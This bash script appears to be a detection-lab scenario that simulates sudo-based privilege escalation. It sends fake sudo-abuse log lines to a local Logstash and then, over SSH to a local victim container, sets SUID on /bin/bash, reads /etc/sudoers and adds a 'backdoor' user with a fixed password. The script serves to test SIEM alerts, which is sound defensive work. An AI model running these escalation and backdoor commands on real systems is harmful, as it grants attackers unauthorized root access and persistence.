#!/bin/bash
# =============================================================
# Scenario 02: Privilege Escalation via Sudo Abuse
# Simulates an attacker escalating privileges after initial access
# =============================================================

TARGET_HOST="localhost"
TARGET_PORT="2222"
LOGSTASH_HOST="localhost"
LOGSTASH_PORT="5000"
ATTACKER_IP="10.10.10.99"

echo "[*] Starting Privilege Escalation simulation..."
echo ""

# Phase 1: Send sudo abuse events to SIEM
echo "[*] Phase 1: Sending privilege escalation events to SIEM..."

SUDO_COMMANDS=(
  "www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash"
  "www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +s /bin/bash"
  "www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'"
)

for cmd in "${SUDO_COMMANDS[@]}"; do
  MESSAGE="<85>$(date) victim sudo: $cmd"
  echo "$MESSAGE" | nc -u -w1 ${LOGSTASH_HOST} ${LOGSTASH_PORT}
  echo "  [!] Sudo abuse: $cmd"
  sleep 0.5
done

echo ""
echo "[*] Phase 2: Simulating SUID binary exploitation on victim..."

# Phase 2: Real commands on victim container
sshpass -p "victim123" ssh \
  -o StrictHostKeyChecking=no \
  -o ConnectTimeout=5 \
  -p ${TARGET_PORT} \
  root@${TARGET_HOST} bash << 'REMOTE'
echo "[+] Current user: $(whoami)"
echo "[+] Setting SUID on /bin/bash (privilege escalation technique)"
chmod +s /bin/bash
ls -la /bin/bash
echo "[+] Checking sudo permissions"
cat /etc/sudoers 2>/dev/null | head -5
echo "[+] Adding backdoor user"
useradd -m -s /bin/bash backdoor 2>/dev/null && echo "backdoor:backdoor123" | chpasswd
echo "[+] Backdoor user created: $(id backdoor)"
REMOTE

echo ""
echo "[+] Scenario 02 complete."
echo "[+] Check Kibana for: tags:privilege_escalation"
echo "[+] Events sent: 3 sudo abuse + real SUID/backdoor simulation"
